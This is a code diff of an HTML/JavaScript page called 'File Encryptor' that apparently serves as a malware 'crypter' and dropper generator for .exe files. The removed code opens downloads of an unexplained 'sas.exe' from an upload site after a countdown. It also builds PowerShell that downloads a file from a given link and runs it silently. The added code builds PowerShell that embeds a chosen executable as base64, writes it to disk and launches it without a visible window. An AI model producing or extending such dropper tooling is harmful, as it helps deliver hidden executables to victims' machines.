@@ -12,13 +12,24 @@
             background-position: center; /* Center the image */
             color: purple; /* Set text color to purple */
             display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
             height: 100vh;
             margin: 0;
             padding: 20px;
             text-align: center;
+        }
+        .container {
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+            width: 100%;
+        }
+        .box {
+            background-color: rgba(255, 255, 255, 0.8); /* Semi-transparent white */
+            border-radius: 10px;
+            padding: 20px;
+            margin: 10px;
+            width: 45%; /* Adjust width as needed */
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
         }
         h1 {
             margin-bottom: 30px;
@@ -29,10 +40,11 @@
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            margin: 10px;
+            margin: 10px 0; /* Vertical margin for buttons */
             background-color: red; /* Set button color to red */
             color: purple; /* Set button text color to purple */
             transition: background-color 0.3s;
+            width: 100%; /* Make buttons full width */
         }
         button:hover {
             background-color: darkred; /* Darker red on hover */
@@ -40,172 +52,77 @@
         input[type="file"] {
             display: none; /* Hides the file input */
         }
-        #file-name, #base64-output {
-            margin-top: 20px;
-            font-size: 18px;
-            color: #ffeb3b; /* Yellow color for file name and output */
-            cursor: pointer; /* Change cursor to indicate clickable */
+        .rainbow-text {
+            font-size: 24px;
+            font-weight: bold;
+            background-image: linear-gradient(to right, red, orange, yellow, green, blue, indigo, violet);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
-        #countdown {
-            margin-top: 10px;
-            font-size: 20px;
-            color: #ffeb3b; /* Yellow color for countdown */
-        }
-        #base64-container, #ps-container {
-            margin-top: 20px;
-        }
-        #base64-output, #ps-output {
+        #ps-output {
             border: 1px solid white; 
             padding: 10px; 
             display: inline-block; 
-            width: 400px; 
+            width: 100%; 
             word-wrap: break-word; 
             color: #ffeb3b; /* Yellow color for output */
-        }
-        #ps-input {
-            width: 400px;
-            padding: 10px;
-            margin: 10px 0;
         }
     </style>
 </head>
 <body>
 
     <h1>File Encryptor</h1>
-    <label id="choose-file-button" for="file-input">Choose File Wanna to Crypt</label>
-    <input type="file" id="file-input" accept=".exe" />
-
-    <button id="encrypt-button">Encrypt</button>
-    <button id="crypter-button">Crypter</button>
-    <button id="encrypted-file-button">Encrypted File</button>
-    <div id="countdown"></div>
-
-    <div id="file-name">No file chosen</div>
-    
-    <div id="base64-container">
-        <div id="base64-output" onclick="copyToClipboard()" title="Click to copy to clipboard">
-            Base64 Encoded File: Click to Generate
+    <div class="container">
+        <div class="box" id="file-selection-box">
+            <h2>Choose the File</h2>
+            <label id="choose-file-button" for="file-input">Choose File</label>
+            <input type="file" id="file-input" accept=".exe" />
+            <div id="file-name" class="rainbow-text">No file chosen</div>
         </div>
-        <button id="copy-code-button" onclick="copyFullCode()">Copy Full Code</button>
-    </div>
 
-    <div id="ps-container">
-        <input type="text" id="ps-input" placeholder="Enter link or path for PowerShell code" />
-        <button id="generate-ps-button" onclick="generatePSScript()">Exe to PowerShell</button>
-        <div id="ps-output">PowerShell Code: Click to Generate</div>
+        <div class="box" id="ps1-generation-box">
+            <h2>PS1 Generation</h2>
+            <button id="generate-ps-button" onclick="generatePSScript()">Generate PS1 Code</button>
+            <div id="ps-output">PowerShell Code: Click to Generate</div>
+        </div>
     </div>
 
     <script>
         let selectedFile;
-        let base64Output = '';
 
-        // Display the name of the chosen file
+        // Display the name of the chosen file with rainbow color
         document.getElementById("file-input").addEventListener("change", function() {
             const fileNameDisplay = document.getElementById("file-name");
             if (this.files.length > 0) {
                 selectedFile = this.files[0]; // Store the selected file
-                fileNameDisplay.textContent = "Selected file: " + selectedFile.name;
+                fileNameDisplay.textContent = selectedFile.name;
             } else {
                 fileNameDisplay.textContent = "No file chosen";
             }
         });
 
-        // Add event listener for the encrypt button
-        document.getElementById("encrypt-button").addEventListener("click", function() {
-            let countdownValue = 10; // Set countdown value to 10 seconds
-            const countdownDisplay = document.getElementById("countdown");
-            countdownDisplay.textContent = `Executing in ${countdownValue} seconds...`;
-
-            // Countdown interval
-            const countdownInterval = setInterval(() => {
-                countdownValue--;
-                countdownDisplay.textContent = `Executing in ${countdownValue} seconds...`;
-
-                // After 10 seconds, open the link and clear the interval
-                if (countdownValue <= 0) {
-                    clearInterval(countdownInterval);
-                    window.open("https://www.upload.ee/download/17207934/3df134c596841f8ad51b/sas.exe", "_blank");
-                    countdownDisplay.textContent = ""; // Clear countdown message
-                }
-            }, 1000); // Update every second
-        });
-
-        // Add event listener for the crypter button
-        document.getElementById("crypter-button").addEventListener("click", function() {
+        // Generate PowerShell script that embeds the selected EXE as base64
+        function generatePSScript() {
             if (!selectedFile) {
                 alert("Please choose a file first.");
                 return;
             }
 
-            let countdownValue = 10; // Set countdown value to 10 seconds
-            const countdownDisplay = document.getElementById("countdown");
-            countdownDisplay.textContent = `Encoding in ${countdownValue} seconds...`;
+            const reader = new FileReader();
 
-            // Countdown interval
-            const countdownInterval = setInterval(() => {
-                countdownValue--;
-                countdownDisplay.textContent = `Encoding in ${countdownValue} seconds...`;
+            reader.onload = function(event) {
+                const base64String = event.target.result.split(',')[1]; // Get Base64 part
+                const psCode = `
+                $base64 = "${base64String}";
+                [System.IO.File]::WriteAllBytes("executable.exe", [System.Convert]::FromBase64String($base64));
+                Start-Process -FilePath "executable.exe" -NoNewWindow;
+                `;
+                document.getElementById("ps-output").textContent = "PowerShell Code: " + psCode.trim(); // Show PowerShell code
+            };
 
-                // After 10 seconds, encode the file to Base64 and clear the interval
-                if (countdownValue <= 0) {
-                    clearInterval(countdownInterval);
-                    const reader = new FileReader();
-
-                    reader.onload = function(event) {
-                        base64Output = event.target.result.split(',')[1]; // Get Base64 part
-                        document.getElementById("base64-output").textContent = "Base64 Encoded File: " + base64Output; // Show Base64 encoded string
-                    };
-
-                    // Read the file as a Data URL (Base64)
-                    reader.readAsDataURL(selectedFile);
-                    countdownDisplay.textContent = ""; // Clear countdown message
-                }
-            }, 1000); // Update every second
-        });
-
-        // Function to copy Base64 string to clipboard
-        function copyToClipboard() {
-            navigator.clipboard.writeText(base64Output).then(() => {
-                alert("Base64 encoded string copied to clipboard!");
-            }).catch(err => {
-                console.error('Error copying to clipboard: ', err);
-            });
+            // Read the file as a Data URL (Base64)
+            reader.readAsDataURL(selectedFile);
         }
-
-        // Function to copy full code to clipboard
-        function copyFullCode() {
-            const fullCode = `
-                let selectedFile; 
-                // Other code here...
-                // Base64 Output: ${base64Output}
-            `;
-            navigator.clipboard.writeText(fullCode.trim()).then(() => {
-                alert("Full code copied to clipboard!");
-            }).catch(err => {
-                console.error('Error copying to clipboard: ', err);
-            });
-        }
-
-        // Generate PowerShell script
-        function generatePSScript() {
-            const path = document.getElementById("ps-input").value;
-            if (!path || !selectedFile) {
-                alert("Please enter a link or path and choose a file.");
-                return;
-            }
-
-            const psCode = `
-                $client = New-Object System.Net.WebClient;
-                $client.DownloadFile("${path}", "${selectedFile.name}");
-                Start-Process "${selectedFile.name}" -ArgumentList '/silent' -NoNewWindow;
-            `;
-            document.getElementById("ps-output").textContent = "PowerShell Code: " + psCode.trim(); // Show PowerShell code
-        }
-
-        // Add event listener for the encrypted file button
-        document.getElementById("encrypted-file-button").addEventListener("click", function() {
-            window.open("https://www.upload.ee/download/17207934/b3663201d1ce1f8adc83/sas.exe", "_blank");
-        });
     </script>
 
 </body>
